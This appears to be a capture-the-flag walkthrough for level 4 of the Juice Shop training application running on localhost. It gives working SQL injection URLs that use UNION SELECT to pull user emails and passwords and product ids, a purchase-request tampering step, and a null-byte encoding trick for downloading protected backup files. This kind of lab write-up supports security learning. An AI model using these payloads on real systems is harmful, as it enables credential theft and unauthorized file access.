# Level 4

## User Credentials
We need to do a sql injection with union select on the users table, we use the search box that is vulnerable and visit this url:

```
http://127.0.0.1:3000/rest/products/search?q=apple')) union select null,email,password,id,NULL,NULL,NULL,NULL,NULL from users --
```

## Christmas Special

We need to retrive the id of the product, to do this we use a sql injection with the union select, on the product search box, this is the url:

```
http://127.0.0.1:3000/rest/products/search?q=apple')) union select id,name,description,price,NULL,NULL,NULL,NULL,NULL from products --
```

We will find that the id is 10, so now as a login user we intercept the buy pocket of a product and sobstitute the id with 10.

## Forgotten Sales Backup

We need to go to /ftp and try to download the "coupons_2013.md.bak" file. To do that we encode the "%" as %25 followed by 00 the code that make file downloadable.

```
wget http://127.0.0.1:3000/ftp/coupons_2013.md.bak%2500.pdf
```

## Forgotten Developer Backup

As [Forgotten Sales Backup](https://github.com/AlessandroMorelli96/Juice-Shop/blob/master/04_Level4.md#Forgotten-Sales-Backup), but this time we download "package.json.bak".

```
http://127.0.0.1:3000/ftp/package.json.bak%2500.pdf
```

## Easter Egg

As [Forgotten Sales Backup](https://github.com/AlessandroMorelli96/Juice-Shop/blob/master/04_Level4.md#Forgotten-Sales-Backup), but this time we download "eastere.gg".

```
http://127.0.0.1:3000/ftp/eastere.gg%2500.pdf
```
